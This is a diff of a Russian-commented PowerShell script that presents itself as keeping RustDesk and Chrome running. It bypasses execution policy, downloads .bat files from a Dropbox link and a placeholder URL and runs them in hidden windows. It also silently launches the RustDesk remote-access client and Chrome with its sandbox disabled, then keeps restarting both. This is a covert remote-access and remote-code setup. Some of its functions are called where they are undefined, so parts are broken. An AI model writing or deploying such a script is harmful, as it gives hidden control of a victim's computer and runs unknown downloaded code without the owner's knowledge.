@@ -1,108 +1,137 @@
-# Установка ExecutionPolicy для выполнения скриптов
+# PowerShell Скрипт для защиты процессов RustDesk и Chrome от завершения и сбоев
+
+# Установка Execution Policy для выполнения скриптов
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 
-# Функция для логирования
-function Write-Log {
+# Функция для скачивания файлов
+function Download-File {
     param (
-        [string]$Message
+        [string]$Uri,
+        [string]$OutFile
     )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Write-Output "$timestamp - $Message"
+    try {
+        Write-Output "Скачивание $Uri ..."
+        Invoke-WebRequest -Uri $Uri -OutFile $OutFile -UseBasicParsing
+        Write-Output "Скачивание завершено: $OutFile"
+    }
+    catch {
+        Write-Error "Не удалось скачать файл: $_"
+        exit 1
+    }
 }
 
-# 1. Скачивание и выполнение Downloads.bat
-Write-Log "Скачивание Downloads.bat..."
-$downloadsUrl = "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1"
-$downloadsPath = "$env:TEMP\Downloads.bat"
-Invoke-WebRequest -Uri $downloadsUrl -OutFile $downloadsPath
-Write-Log "Выполнение Downloads.bat..."
-cmd.exe /c $downloadsPath
-
-# 2. Выполнение show.bat для входа в AnyDesk
-$showBatPath = "$env:TEMP\show.bat"
-if (Test-Path $showBatPath) {
-    Write-Log "Выполнение show.bat для входа в AnyDesk..."
-    cmd.exe /c $showBatPath
-} else {
-    Write-Log "show.bat не найден по пути $showBatPath. Пропуск шага."
-}
-
-# 3. Функция для запуска процесса в скрытом режиме
+# Функция для запуска процесса в скрытом режиме
 function Start-HiddenProcess {
     param (
-        [string]$ExePath,
-        [string[]]$Arguments = @()
+        [string]$ExecutablePath,
+        [array]$Arguments = @()
     )
-    Write-Log "Запуск $ExePath в скрытом режиме..."
-    Start-Process -FilePath $ExePath -ArgumentList $Arguments -WindowStyle Hidden
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $ExecutablePath
+    $psi.Arguments = $Arguments -join " "
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.CreateNoWindow = $true
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    Write-Output "$ExecutablePath запущен скрытым образом."
 }
 
-# 4. Функция для мониторинга процесса
+# Функция для мониторинга процессов
 function Start-ProcessMonitor {
     param (
         [string]$ProcessName,
-        [ScriptBlock]$RestartBlock
+        [string]$ExecutablePath,
+        [array]$Arguments = @()
     )
     Start-Job -Name "Monitor_$ProcessName" -ScriptBlock {
+        param ($ProcessName, $ExecutablePath, $Arguments)
         while ($true) {
             Start-Sleep -Seconds 15
-            $proc = Get-Process -Name $using:ProcessName -ErrorAction SilentlyContinue
+            $proc = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
             if (-not $proc) {
-                Write-Log "$ProcessName не найден. Перезапуск..."
-                & $using:RestartBlock
-                Write-Log "$ProcessName был перезапущен."
+                Write-Output "$ProcessName не найден. Перезапуск..."
+                Start-HiddenProcess -ExecutablePath $ExecutablePath -Arguments $Arguments
+                Write-Output "$ProcessName был перезапущен."
             }
         }
+    } -ArgumentList $ProcessName, $ExecutablePath, $Arguments
+    Write-Output "Монитор для $ProcessName запущен."
+}
+
+# Функция для предотвращения завершения процессов
+function Prevent-Termination {
+    $criticalProcesses = @("chrome", "rustdesk")
+    foreach ($proc in $criticalProcesses) {
+        Register-ObjectEvent -InputObject (Get-Process -Name $proc -ErrorAction SilentlyContinue) -EventName Exited -Action {
+            Start-HiddenProcess -ExecutablePath "$($env:ProgramFiles)\$proc\$proc.exe" # Укажите правильный путь
+            Write-Output "$proc.exe завершился и был перезапущен."
+        } | Out-Null
     }
+    Write-Output "Регистрация событий для предотвращения завершения критических процессов выполнена."
 }
 
-# 5. Запуск и мониторинг Chrome
-$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
-if (Test-Path $chromePath) {
-    Start-HiddenProcess -ExePath $chromePath -Arguments @("--no-sandbox")
-    Start-ProcessMonitor -ProcessName "chrome" -RestartBlock { Start-HiddenProcess -ExePath $chromePath -Arguments @("--no-sandbox") }
-} else {
-    Write-Log "chrome.exe не найден по пути $chromePath."
-}
-
-# 6. Запуск и мониторинг RustDesk
-$rustdeskPath = "C:\Program Files\RustDesk\rustdesk.exe"
-if (Test-Path $rustdeskPath) {
-    Start-HiddenProcess -ExePath $rustdeskPath
-    Start-ProcessMonitor -ProcessName "rustdesk" -RestartBlock { Start-HiddenProcess -ExePath $rustdeskPath }
-} else {
-    Write-Log "rustdesk.exe не найден по пути $rustdeskPath."
-}
-
-# 7. Создание дополнительного мониторингового скрипта для критических процессов
-$monitorScriptPath = "$env:ProgramData\MonitorProcesses.ps1"
-$monitorScriptContent = @"
-while ($true) {
-    Start-Sleep -Seconds 20
-    \$processes = @('chrome', 'rustdesk')
-    foreach (\$proc in \$processes) {
-        if (-not (Get-Process -Name \$proc -ErrorAction SilentlyContinue)) {
-            Write-Output "\$proc.exe не запущен. Перезапуск..."
-            Start-Process "\$proc.exe" -WindowStyle Hidden
+# Функция для таймера
+function Start-TimeCounter {
+    Start-Job -Name "TimeCounter" -ScriptBlock {
+        $startTime = Get-Date
+        while ($true) {
+            Start-Sleep -Seconds 60
+            $elapsed = (Get-Date) - $startTime
+            Write-Output "Прошло времени: $($elapsed.Hours) часов, $($elapsed.Minutes) минут, $($elapsed.Seconds) секунд."
         }
     }
-}
-"@
-
-Write-Log "Создание дополнительного мониторингового скрипта по пути $monitorScriptPath..."
-$monitorScriptContent | Out-File -FilePath $monitorScriptPath -Encoding UTF8
-
-# 8. Запуск дополнительного мониторингового скрипта в скрытом режиме
-Write-Log "Запуск дополнительного мониторингового скрипта..."
-Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$monitorScriptPath`"" -WindowStyle Hidden
-
-# 9. Запуск таймерного скрипта time.py
-$timeScriptPath = "C:\Path\To\time.py" # Замените на фактический путь к time.py
-if (Test-Path $timeScriptPath) {
-    Write-Log "Запуск time.py..."
-    Start-Process -FilePath "python.exe" -ArgumentList "`"$timeScriptPath`"" -WindowStyle Normal
-} else {
-    Write-Log "time.py не найден по пути $timeScriptPath."
+    Write-Output "Таймер запущен."
 }
 
-Write-Log "Скрипт успешно запущен."
+# Основная логика скрипта
+
+# 1. Скачивание и установка необходимых компонентов
+# Пример: скачивание Downloads.bat, если необходимо
+# Замените URL на актуальный или интегрируйте необходимые команды установки
+$downloadsBatUrl = "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1"
+$downloadsBatPath = "$env:TEMP\Downloads.bat"
+Download-File -Uri $downloadsBatUrl -OutFile $downloadsBatPath
+
+# Выполнение Downloads.bat
+Write-Output "Выполнение Downloads.bat ..."
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$downloadsBatPath`"" -WindowStyle Hidden -Wait
+Write-Output "Downloads.bat выполнен."
+
+# 2. Вход в AnyDesk или RustDesk
+# Предполагается, что show.bat выполняет вход. Если это так, интегрируйте команды напрямую
+$showBatPath = "$env:TEMP\show.bat"
+Download-File -Uri "https://example.com/show.bat" -OutFile $showBatPath # Замените на актуальный URL
+Write-Output "Выполнение show.bat ..."
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$showBatPath`"" -WindowStyle Hidden -Wait
+Write-Output "show.bat выполнен."
+
+# 3. Запуск и мониторинг Chrome
+$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe" # Укажите правильный путь, если отличается
+if (Test-Path $chromePath) {
+    Start-HiddenProcess -ExecutablePath $chromePath -Arguments @("--no-sandbox")
+    Start-ProcessMonitor -ProcessName "chrome" -ExecutablePath $chromePath -Arguments @("--no-sandbox")
+}
+else {
+    Write-Error "chrome.exe не найден по пути $chromePath"
+}
+
+# 4. Запуск и мониторинг RustDesk
+$rustdeskPath = "C:\Program Files\RustDesk\rustdesk.exe" # Укажите правильный путь
+if (Test-Path $rustdeskPath) {
+    Start-HiddenProcess -ExecutablePath $rustdeskPath
+    Start-ProcessMonitor -ProcessName "rustdesk" -ExecutablePath $rustdeskPath
+}
+else {
+    Write-Error "rustdesk.exe не найден по пути $rustdeskPath"
+}
+
+# 5. Предотвращение завершения критических процессов
+Prevent-Termination
+
+# 6. Запуск таймера
+Start-TimeCounter
+
+# Удержание скрипта активным
+Write-Output "Скрипт запущен и работает. Нажмите Ctrl+C для завершения."
+while ($true) {
+    Start-Sleep -Seconds 60
+}
